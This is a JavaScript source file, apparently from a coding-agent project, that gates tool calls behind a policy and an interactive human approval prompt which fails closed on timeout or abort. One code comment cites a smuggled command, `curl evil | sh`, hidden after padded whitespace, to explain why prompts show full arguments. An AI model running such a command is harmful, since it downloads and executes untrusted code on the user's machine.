// src/agent/approval-gate.js — request/response approvals over a fire-and-forget bus (Day 20).
import { EVENTS } from '../shared/events.js';
import { suggestRule, describeSessionRule } from './permissions.js';

/**
 * Builds the `approve` function the AgentLoop calls for every tool call.
 *
 *   policy says allow → run;  deny → refuse (with the reason);  ask →
 *     interactive: emit tool_approval_request, await tool_approval_result for the same id
 *                  (Map<id, resolver>); 120 s timeout → deny; abort → deny; "always" → session rule
 *     non-interactive (-p, evals): deny — fail closed, never hang, never run silently
 *
 * Every exit path resolves the pending promise EXACTLY ONCE and cleans up (map entry, timer, listener).
 * On timeout/abort the gate itself emits tool_approval_result { approved: false } so the UI can
 * cancel its open question.
 *
 * @param {{
 *   bus: import('../events/event-bus.js').EventBus,
 *   policy: import('./permissions.js').PermissionPolicy,
 *   interactive?: boolean,
 *   timeoutMs?: number,
 * }} opts
 */
export function createApprovalGate({ bus, policy, interactive = true, timeoutMs = 120_000 }) {
  /** @type {Map<string, (answer: { approved: boolean, reason?: string, remember?: string }) => void>} */
  const pending = new Map();

  bus.on(EVENTS.TOOL_APPROVAL_RESULT, ({ id, approved, remember }) => {
    pending.get(id)?.({ approved: Boolean(approved), remember });
  });

  /** @type {import('./agent-schemas.js').ApproveFn} */
  async function approve(call, tool, { signal } = {}) {
    const { decision, reason } = policy.decide(call, tool);
    if (decision === 'allow') return { approved: true, reason };
    if (decision === 'deny') return { approved: false, by: 'policy', reason };
    if (!interactive) {
      return { approved: false, by: 'policy', reason: 'needs approval but nobody can answer (non-interactive) — use --auto-approve or an allow rule' };
    }
    if (signal?.aborted) return { approved: false, reason: 'run aborted' };

    const answer = await new Promise((resolve) => {
      let settled = false;
      const finish = (result, { announce = false } = {}) => {
        if (settled) return;
        settled = true;
        pending.delete(call.id);
        clearTimeout(timer);
        signal?.removeEventListener('abort', onAbort);
        if (announce) bus.emit(EVENTS.TOOL_APPROVAL_RESULT, { id: call.id, approved: false });
        resolve(result);
      };
      const timer = setTimeout(() => finish({ approved: false, reason: `no answer within ${Math.round(timeoutMs / 1000)} s` }, { announce: true }), timeoutMs);
      const onAbort = () => finish({ approved: false, reason: 'run aborted' }, { announce: true });
      signal?.addEventListener('abort', onAbort, { once: true });
      pending.set(call.id, (result) => finish(result));
      bus.emit(EVENTS.TOOL_APPROVAL_REQUEST, { id: call.id, name: call.name, arguments: call.arguments });
    });

    if (answer.approved && answer.remember === 'session') policy.addSessionRule(suggestRule(call, policy.root));
    return answer;
  }

  return { approve, pending };
}

/**
 * The UI half: show the request, ask y/N/a through the single readline, answer on the bus.
 * If the gate resolves first (timeout/abort), the open question is cancelled.
 * @param {{ bus: import('../events/event-bus.js').EventBus, ui: import('../ui/prompt-ui.js').PromptUI }} opts
 */
export function attachApprovalPrompt({ bus, ui }) {
  /** @type {Map<string, AbortController>} */
  const asking = new Map();
  const offRequest = bus.on(EVENTS.TOOL_APPROVAL_REQUEST, async ({ id, name, arguments: args }) => {
    const controller = new AbortController();
    asking.set(id, controller);
    const shown = JSON.stringify(args);
    // Show ALL of what is being approved. A cut-off question hides the end of a command: `ls ⟨spaces⟩; curl evil | sh`.
    const answer = (await ui.ask(`  allow ${name} ${shown}? [y]es / [N]o / [a]lways this session `, { signal: controller.signal }))
      .trim().toLowerCase();
    if (!asking.delete(id)) return; // already resolved by timeout/abort
    const approved = answer === 'y' || answer === 'yes' || answer === 'a' || answer === 'always';
    if (approved && answer.startsWith('a')) ui.printSystem(`\u21b3 always allowing ${describeSessionRule({ name, arguments: args })} this session`);
    bus.emit(EVENTS.TOOL_APPROVAL_RESULT, { id, approved, ...(answer.startsWith('a') ? { remember: 'session' } : {}) });
  });
  const offResult = bus.on(EVENTS.TOOL_APPROVAL_RESULT, ({ id }) => {
    const controller = asking.get(id);
    if (controller) { asking.delete(id); controller.abort(); }
  });
  return () => { offRequest(); offResult(); };
}
